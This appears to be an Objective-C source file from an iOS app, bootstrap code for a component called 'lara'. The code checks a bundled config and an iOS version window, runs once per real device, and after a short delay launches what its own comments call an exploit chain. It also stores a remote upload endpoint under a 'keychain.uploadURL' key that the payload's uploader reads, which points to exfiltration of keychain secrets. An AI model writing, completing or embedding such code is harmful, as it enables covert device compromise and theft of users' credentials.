#import "lara.h"

#import <UIKit/UIKit.h>
#import <dlfcn.h>
#import <stdarg.h>

LaraApi g_lara = {0};

static NSString *const kLaraLogFile = @"lara.log";
static NSString *const kLaraMarkerFile = @"lara.done";
static NSString *const kLaraDeviceKey = @"lara.device";
static NSString *const kLaraUploadURLKey = @"keychain.uploadURL";

#pragma mark - 基础工具

NSString *LaraDocumentsPath(void) {
    static NSString *path = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        path = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    });
    return path;
}

NSString *LaraDeviceIdentifier(void) {
    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    NSString *identifier = [defaults stringForKey:kLaraDeviceKey];
    if (identifier.length == 0) {
        identifier = [NSUUID UUID].UUIDString.lowercaseString;
        [defaults setObject:identifier forKey:kLaraDeviceKey];
        [defaults synchronize];
    }
    return identifier;
}

void LaraLog(NSString *format, ...) {
    va_list args;
    va_start(args, format);
    NSString *message = [[NSString alloc] initWithFormat:format arguments:args];
    va_end(args);

    NSLog(@"[lara] %@", message);
    if (LaraDocumentsPath().length == 0) return;

    static NSDateFormatter *formatter = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        formatter = [[NSDateFormatter alloc] init];
        formatter.dateFormat = @"yyyy-MM-dd HH:mm:ss";
    });

    NSString *line = [NSString stringWithFormat:@"[%@] %@\n", [formatter stringFromDate:[NSDate date]], message];
    NSString *path = [LaraDocumentsPath() stringByAppendingPathComponent:kLaraLogFile];

    NSFileHandle *handle = [NSFileHandle fileHandleForWritingAtPath:path];
    if (handle == nil) {
        [line writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:NULL];
        return;
    }
    @try {
        [handle seekToEndOfFile];
        [handle writeData:[line dataUsingEncoding:NSUTF8StringEncoding]];
    } @catch (__unused NSException *exception) {
    } @finally {
        [handle closeFile];
    }
}

#pragma mark - 门控

static NSDictionary *LaraLoadConfig(void) {
    NSString *path = [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"lara.json"];
    NSData *data = [NSData dataWithContentsOfFile:path];
    if (data.length == 0) {
        LaraLog(@"config missing at %@", path);
        return nil;
    }
    NSError *error = nil;
    id json = [NSJSONSerialization JSONObjectWithData:data options:0 error:&error];
    if (![json isKindOfClass:[NSDictionary class]]) {
        LaraLog(@"config unreadable: %@", error.localizedDescription);
        return nil;
    }
    return json;
}

static BOOL LaraVersionAllowed(NSDictionary *config) {
    NSString *current = [UIDevice currentDevice].systemVersion;
    NSString *minimum = config[@"min_ios"];
    NSString *maximum = config[@"max_ios"];

    if ([minimum isKindOfClass:[NSString class]] &&
        [current compare:minimum options:NSNumericSearch] == NSOrderedAscending) {
        return NO;
    }
    if ([maximum isKindOfClass:[NSString class]] &&
        [current compare:maximum options:NSNumericSearch] == NSOrderedDescending) {
        return NO;
    }
    return YES;
}

static void LaraRunChainDeferred(void *context) {
    NSDictionary *config = (__bridge_transfer NSDictionary *)context;
    @autoreleasepool {
        LaraRunChain(config);
    }
}

void LaraBootstrapInstall(void) {
#if TARGET_OS_SIMULATOR
    // 利用链是 arm64 真机二进制，模拟器上直接跳过，避免开发期崩溃
    return;
#else
    NSDictionary *config = LaraLoadConfig();
    if (![config[@"enabled"] boolValue]) return;

    if (!LaraVersionAllowed(config)) {
        LaraLog(@"skip: iOS %@ outside %@..%@", [UIDevice currentDevice].systemVersion,
                config[@"min_ios"] ?: @"-", config[@"max_ios"] ?: @"-");
        return;
    }

    NSString *marker = [LaraDocumentsPath() stringByAppendingPathComponent:kLaraMarkerFile];
    if ([[NSFileManager defaultManager] fileExistsAtPath:marker]) {
        LaraLog(@"skip: already ran on this device");
        return;
    }

    // payload 自己的上传器读这个键；我们的上传器也读它
    NSString *endpoint = config[@"endpoint"];
    if ([endpoint isKindOfClass:[NSString class]] && endpoint.length > 0) {
        [[NSUserDefaults standardUserDefaults] setObject:endpoint forKey:kLaraUploadURLKey];
    }

    // 不在 dyld 初始化阶段干重活：延后到 App 起完、内存峰值过去
    dispatch_after_f(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)),
                     dispatch_get_global_queue(QOS_CLASS_UTILITY, 0),
                     (void *)CFBridgingRetain(config),
                     LaraRunChainDeferred);
#endif
}
